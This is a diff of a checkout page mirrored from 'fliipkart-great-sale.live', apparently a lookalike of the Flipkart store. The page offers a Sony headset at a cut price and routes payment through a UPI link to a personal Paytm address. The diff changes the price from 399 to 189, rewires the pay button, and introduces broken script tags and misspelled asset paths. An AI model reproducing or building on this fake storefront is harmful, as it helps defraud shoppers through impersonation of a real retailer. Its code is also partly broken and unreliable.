@@ -17,16 +17,14 @@
     <!-- Include other JavaScript files here -->
 
     <script>
-        function openPaytmUPI() {
-        const paytmUPI = "upi://pay?pa=rishabh897@paytm&";
-        const amount = "189"; // Change this to your desired payment amount in Indian Rupees
-        const params = `pn=ServiceStation&tn=SONY WI-C310 Bluetooth Headset&am=${amount}&cu=INR&mode=02&tr`;
+        const pytm = "upi://pay?pa=rishabh897@paytm&";
 
-        // Create the complete UPI payment link
-        const paytmUPILink = paytmUPI + params;
-
-        // Open the UPI payment app
-        window.open(upiLink, '_blank');
+        // Define JavaScript functions here, e.g., myFunction, startTimer, etc.
+        function myFunction() {
+            if (document.getElementById('radio1').checked) {
+                document.getElementById('linkid').href = pytm + "pn=ServiceStation&tn=SONY WI-C310 Bluetooth Headset&am=189&cu=INR&mode=02&tr";
+            }
+        }
 
         function startTimer(duration, display) {
             var timer = duration, minutes, seconds;
@@ -137,7 +135,7 @@
             <div class="container-fluid">
                 <div class="header-wrap">
                     <div class="logo logo-width-1">
-                        <a href="index.html"><img src="assets/imgs/logo.png" alt="logo"></a>
+                        <a href="index-2.html"><img src="assets/imgs/logo.png" alt="logo"></a>
                     </div>
                     <div class="header-right" style="display: block; margin-right: 15px;">    
                         <div class="header-action-right">
@@ -164,7 +162,7 @@
             <div class="container">
                 <div class="header-wrap header-space-between position-relative  main-nav">
                     <div class="logo logo-width-1 d-block d-lg-none">
-                        <a href="index.html"><img src="assets/imgs/logo.png" alt="logo"></a>
+                        <a href="index-2.html"><img src="assets/imgs/logo.png" alt="logo"></a>
                     </div>
                     <div class="header-action-right d-block d-lg-none">
                         <div class="header-action-2">
@@ -623,7 +621,7 @@
                         <div class="_1s60nC _2t8HQf">
                             <div>Amount Payable</div>
                             <div class="_38ubMW">
-                                <div class="_3NH1UN">₹399</div>
+                                <div class="_3NH1UN">₹189</div>
                             </div>
                         </div>
                     </div>
@@ -636,8 +634,8 @@
     <img src="pdata/safety-label-badge-7422523d.jpg" />
     <img src="pdata/safety-label-en-7f5199bc.svg" />
     <div class="button-container flex">
-    <button onclick="openPaytmUPI()">Pay 399</button>
-
+    <a class="common-button"  onclick='myFunction()' id="linkid">
+    PAY 189
     </a>
     </div>
     </div>
@@ -655,14 +653,14 @@
     <script src="assets/js/plugins/jquery.syotimer.min.js"></script>
     <script src="assets/js/plugins/wow.js"></script>
     <script src="assets/js/plugins/jquery-ui.js"></script>
-    <script src="assets/js/plugins/perfect-scrollbar.js"></script>
+    <scriptsrc="assets/js/plugins/perfect-scrollbar.js"></script>
     <script src="assets/js/plugins/magnific-popup.js"></script>
     <script src="assets/js/plugins/select2.min.js"></script>
-    <script src="assets/js/plugins/waypoints.js"></script>
+    <script src="assets/js/plugins/wypoints.js"></script>
     <script src="assets/js/plugins/counterup.js"></script>
     <script src="assets/js/plugins/jquery.countdown.min.js"></script>
     <script src="assets/js/plugins/images-loaded.js"></script>
-    <script src="assets/js/plugins/isotope.js"></script>
+    <script src="ssets/js/plugins/isotope.js"></script>
     <script src="assets/js/plugins/scrollup.js"></script>
     <script src="assets/js/plugins/jquery.vticker-min.js"></script>
     <script src="assets/js/plugins/jquery.theia.sticky.js"></script>
@@ -674,7 +672,7 @@
     
     
     
-    
+   
     
     <!-- Mirrored from fliipkart-great-sale.live/upis4/annap/cart1.php by HTTrack Website Copier/3.x [XR&CO'2014], Thu, 29 Jun 2023 18:42:18 GMT -->
     
@@ -684,4 +682,4 @@
     </html>
     
     
-    
+   
